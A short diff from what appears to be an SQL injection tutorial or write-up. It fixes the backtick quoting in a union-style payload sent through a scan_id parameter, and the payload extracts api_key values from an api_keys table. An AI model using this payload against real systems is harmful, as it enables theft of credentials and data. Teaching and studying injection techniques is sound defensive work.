@@ -413,7 +413,7 @@ We've extracted sensitive API keys from a completely different table.
 Let's break down:
 
 ```bash
-scan_id=x`+FROM+(SELECT+api_key+AS+'x+FROM+api_keys)y;--+-
+scan_id=x`+FROM+(SELECT+api_key+AS+`'x`+FROM+api_keys)y;--+-
 ```
 
 | **Part** | **Purpose** |
